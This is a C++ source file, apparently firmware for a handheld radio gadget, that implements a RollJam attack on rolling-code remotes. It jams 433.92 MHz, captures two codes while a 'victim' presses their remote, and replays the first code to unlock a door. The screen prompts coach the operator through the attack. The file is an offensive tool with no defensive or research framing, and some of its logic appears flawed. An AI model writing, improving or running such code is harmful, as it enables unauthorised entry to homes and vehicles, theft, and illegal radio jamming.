// rolljam.cpp
#include "rolljam.h"
#include "../hardware/hw_radio.h"
#include "../ui/ui_draw.h"
#include "../hardware/hw_input.h"

void rolljam_init() { radio_init(); }

void rolljam_run(cyd_state_t* state) {
    enum { IDLE, JAMMING, CAPTURED1, CAPTURED2, READY, DONE };
    if(state->phase == 0) {
        cyd_draw_red_light("Place device. Don't press anything yet.");
        cyd_draw_attack("ROLLJAM");
        cyd_draw_log("Press OK to jam/capture.");
        if(cyd_read_button() == CYD_BTN_OK) {
            radio_jam(433920000, 3);
            state->phase = JAMMING;
        }
    }
    if(state->phase == JAMMING) {
        cyd_draw_log("Jamming! Have victim press their remote.");
        if (radio_signal_captured()) {
            state->code_buf[0] = radio_get_captured();
            radio_stop();
            cyd_draw_log("First code CAPTURED. Wait for 2nd...");
            state->phase = CAPTURED1;
        }
    }
    if(state->phase == CAPTURED1) {
        if(radio_signal_captured()) {
            state->code_buf[1] = radio_get_captured();
            cyd_draw_log("Second code CAPTURED. Ready to replay!");
            state->phase = READY;
        }
    }
    if(state->phase == READY) {
        cyd_draw_green_light("Press OK to replay. Door unlocks NOW!");
        if(cyd_read_button() == CYD_BTN_OK) {
            radio_send_code(433920000, 1, state->code_buf[0]);
            cyd_draw_log("Replay sent. Unlock now.");
            state->phase = DONE;
        }
    }
    if(state->phase == DONE) {
        cyd_draw_log("Attack finished. Reset for next go.");
    }
}
